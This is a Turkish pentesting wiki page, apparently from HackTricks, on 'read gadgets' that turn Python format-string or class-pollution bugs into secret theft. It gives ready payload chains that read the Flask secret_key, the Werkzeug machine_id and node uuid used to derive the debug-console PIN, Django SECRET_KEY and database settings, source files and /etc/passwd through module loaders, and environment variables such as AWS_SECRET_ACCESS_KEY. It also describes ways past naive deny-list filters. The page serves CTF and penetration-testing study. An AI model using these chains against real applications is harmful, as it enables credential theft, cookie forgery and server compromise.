# Python Internal Read Gadgets

## Temel Bilgiler

[**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) veya [**Class Pollution**](class-pollution-pythons-prototype-pollution.md) gibi farklı güvenlik açıkları, **python dahili verilerini okumanıza ancak kod çalıştırmanıza izin vermeyebilir**. Bu nedenle bir pentester, **hassas yetkiler elde etmek ve güvenlik açığını escalate etmek** için bu okuma izinlerinden en iyi şekilde yararlanmalıdır.

### Flask - secret key okuma

Bir Flask uygulamasının ana sayfasında muhtemelen bu **secret'ın yapılandırıldığı** **`app`** global nesnesi bulunur.
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
Bu durumda, [**Bypass Python sandboxes sayfasındaki**](bypass-python-sandboxes/index.html) **global objects'a erişmek** için herhangi bir gadget kullanarak bu objeye erişmek mümkündür.

**Vulnerability farklı bir python dosyasındaysa**, ana dosyaya ulaşmak ve **global object `app.secret_key`'e erişmek** için dosyalar arasında gezinmeye yarayan bir gadget gerekir; böylece bu key'i bilerek [**privilege escalation**](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign) gerçekleştirebilirsiniz.

[Bu writeup'tan](https://ctftime.org/writeup/36082):<sup>[[3]](#references)</sup> şöyle bir payload:
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
Bu payload'ı **app.secret_key değerini okumak** için kullanın. Orijinal bug size bir write primitive de sağlıyorsa (örneğin class pollution), aynı path kullanılarak bu değer değiştirilebilir ve daha ayrıcalıklı Flask cookie'leri imzalanabilir.

### Werkzeug - machine_id ve node uuid

[**Bu writeup'taki payload'ları kullanarak**](https://vozec.fr/writeups/tweedle-dum-dee/) **machine_id** ve **uuid** node değerlerine erişebilirsiniz. Bunlar, [**Werkzeug pin'i oluşturmak**](../../network-services-pentesting/pentesting-web/werkzeug.md) ve **debug mode etkinse** `/console` içindeki Python console'a erişmek için ihtiyaç duyduğunuz **private bit** değerleridir:<sup>[[4]](#references)</sup>
```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
```
> [!WARNING]
> Web sayfasında **bazı hatalar** oluşturarak **sunucunun `app.py` için yerel yolunu** elde edebileceğinizi ve bunun size **yolu vereceğini** unutmayın.

Zafiyet farklı bir python dosyasındaysa, ana python dosyasındaki nesnelere erişmek için önceki Flask tekniğini kontrol edin.

### Django - SECRET_KEY ve settings module

Django settings nesnesi, uygulama başlatıldığında `sys.modules` içinde cache'lenir. Yalnızca read primitives ile **`SECRET_KEY`**, fallback keys, database credentials veya signing salts leak edebilirsiniz:
```python
# When DJANGO_SETTINGS_MODULE is set (usual case)
sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY

# Through the global settings proxy
a = sys.modules['django.conf'].settings
(a.SECRET_KEY, a.SECRET_KEY_FALLBACKS, a.DATABASES, a.SIGNING_BACKEND,
a.SESSION_ENGINE, a.SESSION_SERIALIZER)
```
Savunmasız gadget başka bir modüldeyse, önce globals'ı dolaşın:
```python
__init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
```
`SECRET_KEY_FALLBACKS`, mevcut `SECRET_KEY` kadar değerlidir: rotation sırasında eski imzalı değerleri hâlâ doğrularlar.<sup>[[1]](#references)</sup> Ayrıca etkinin yalnızca cookie forgery mi yoksa daha güçlü bir şey mi olduğunu hızlıca belirlemek için `SESSION_ENGINE` ve `SESSION_SERIALIZER` değerlerini de leak edin. Web etkisiyle ilgili ayrıntılar için [**Django pentesting page**](../../network-services-pentesting/pentesting-web/django.md) sayfasına bakın.

### Module loader gadgets - source code ve dosyaları okuma

Yüklenen Python modülleri genellikle bir `__loader__` tutar. File-backed loader'lar sıkça `get_source()` ve `get_data()` işlevlerini açığa çıkarır; bunlar, zaten bir module object'e erişebildiğiniz ancak `open()` işlevine erişemediğiniz durumlarda mükemmel **salt okunur primitive'lerdir**:
```python
m = __init__.__globals__['sys'].modules['__main__']
m.__loader__.get_source(m.__name__)   # source of app.py / __main__
m.__loader__.get_data(m.__file__)     # raw bytes of the same file
```
Bu, **config modules, blueprints, helper files veya hidden routes** dökümü almak ve API keys, DSNs, flag paths ya da ek gadget entry points kurtarmak için çok kullanışlıdır.

Yalnızca subclass enumeration varsa, sabit bir index kullanmak yerine loader'ı ada göre arayın:
```python
# unbound call: first argument acts as a dummy self
[c for c in object.__subclasses__() if c.__name__ == 'FileLoader'][0].get_data('.', '/etc/passwd')
```
### Generator / coroutine frame globals

Bir generator/coroutine nesnesi oluşturabilir veya ona erişebilirseniz, herhangi bir function `__globals__` gadget'ına ihtiyaç duymadan frame üzerinden globals leak edebilirsiniz. Bu, yalnızca dunder adlarını engelleyen ve `gi_frame`, `ag_frame`, `cr_frame` veya `f_globals` gibi frame attribute'larını gözden kaçıran filtreleri aşmak için kullanışlıdır:
```python
(_ for _ in ()).gi_frame.f_globals['__builtins__']
(_ for _ in ()).gi_frame.f_globals['sys'].modules['os'].environ
```
Frame globals elde ettikten sonra diğer gadget'larda (`sys.modules`, settings objects, `os.environ`, vb.) olduğu gibi devam edin. Recent sandbox escapes, `gi_frame` ve `f_globals` dunder attribute olmadığından ve çoğu zaman naif deny-list'lerden kurtulduğundan bunu tekrar tekrar keşfediyor.

### Yüklenmiş modüller üzerinden environment variables / cloud creds

Birçok jail hâlâ bir yerde `os` veya `sys` import ediyor. Ulaşılabilir herhangi bir `__init__.__globals__` işlevini kullanarak zaten import edilmiş `os` modülüne pivot edebilir ve API token'ları, cloud key'leri veya flag'leri içeren **environment variables** değerlerini dökebilirsiniz:
```python
# Classic os._wrap_close subclass index may change per version
cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
```
Alt sınıf index'i filtrelenmişse, loaders kullanın:
```python
__loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
```
Environment variables, read'dan full compromise'a geçmek için gereken tek secret'lar olabilir (cloud IAM keys, database URLs, signing keys vb.).

### Django-Unicorn class pollution (CVE-2025-24370)

`django-unicorn` ([**GHSA-g9wf-5777-gq43**](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43), etkilenen sürümler `<0.61.0`) hazırlanmış component request'leri üzerinden **class pollution** yapılmasına izin veriyordu. `__init__.__globals__` gibi bir property path, component module globals'larına ve import edilmiş module'lere erişebiliyordu; advisory, salt okunur bir exploit yerine Django'nun `SECRET_KEY` değerinin ve `os.environ` içindeki değerlerin üzerine yazmayı gösteriyor.<sup>[[5]](#references)</sup> Ayrı bir bug aynı object graph'a read access sağlarsa bu globals, code execution gerektirmeden configuration ve credentials açığa çıkarabilir.

### Gadget collections for chaining

Recent CTF'ler ve pyjail araştırmaları, yalnızca attribute access ve subclass enumeration kullanılarak oluşturulan güvenilir read chain'ler gösteriyor. [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker) gibi community-maintained listeler, object'lerden `__globals__`, `sys.modules` ve son olarak sensitive data'ya geçiş yapmak için birleştirebileceğiniz yüzlerce minimal gadget'ı kataloglar.<sup>[[2]](#references)</sup> Raw subclass index'leri yerine **attribute/name based searches** kullanmayı tercih edin; `os._wrap_close`, `FileLoader`, `warnings.catch_warnings` vb. öğelerin konumu, Python sürümleri arasında ve ek imported library'lerle birlikte değişir.

## References

- [1] [Django cryptographic signing docs](https://docs.djangoproject.com/en/6.0/topics/signing/)
- [2] [pyjailbreaker – Python sandbox gadget wiki](https://github.com/jailctf/pyjailbreaker)
- [3] [CTFtime.org / idekCTF 2022 / task manager / Writeup](https://ctftime.org/writeup/36082)
- [4] [Tweedle Dum & Dee – FCSC 2023 writeup](https://vozec.fr/writeups/tweedle-dum-dee/)
- [5] [Django-Unicorn Class Pollution Vulnerability, Leading to RCE, XSS, DoS and Authentication Bypass (GHSA-g9wf-5777-gq43)](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43)
{{#include ../../banners/hacktricks-training.md}}
